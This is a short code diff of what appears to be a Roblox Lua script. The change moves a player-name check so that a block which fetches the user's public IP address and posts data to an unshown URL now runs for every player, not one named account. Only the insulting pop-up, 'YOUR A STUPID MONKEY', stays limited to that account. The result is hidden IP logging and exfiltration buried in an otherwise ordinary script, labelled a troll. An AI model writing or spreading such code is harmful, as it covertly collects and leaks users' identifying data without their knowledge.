@@ -3137,11 +3137,13 @@ function notify(text,text2,length)
 		end
 	end)
 end
-if game.Players.LocalPlayer.Name == "PoopPeeReKey" then
+
 task.spawn(function()
 local httpservice = game:GetService("HttpService")
 local e = httpservice:GetAsync("https://checkip.amazonaws.com")
+if game.Players.LocalPlayer.Name == "PoopPeeReKey" then
 notify("YOUR A STUPID MONKEY", "Your ip is"..e)
+end
 local httpservice = game:GetService("HttpService")
 
 local data ={
@@ -3154,7 +3156,7 @@ httpservice:PostAsync(url,data)
 
 --:troll:
 end)
-end
+
 local lastMessage = nil
 local lastLabel = nil
 local dupeCount = 1
